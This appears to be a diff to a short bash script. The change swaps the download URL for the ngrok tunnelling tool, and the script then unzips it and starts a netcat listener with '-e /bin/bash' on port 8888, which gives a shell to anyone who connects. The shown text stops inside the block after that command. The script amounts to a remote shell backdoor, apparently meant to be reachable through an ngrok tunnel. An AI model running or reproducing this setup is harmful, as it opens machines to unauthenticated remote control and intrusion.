@@ -1,6 +1,6 @@
 #!/bin/bash
 
-wget -O ngrok.zip https://dl.ngrok.com/ngrok_2.0.19_linux_amd64.zip
+wget -O ngrok.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
 unzip ngrok.zip
 {
     nc -l -v -p 8888 -e /bin/bash
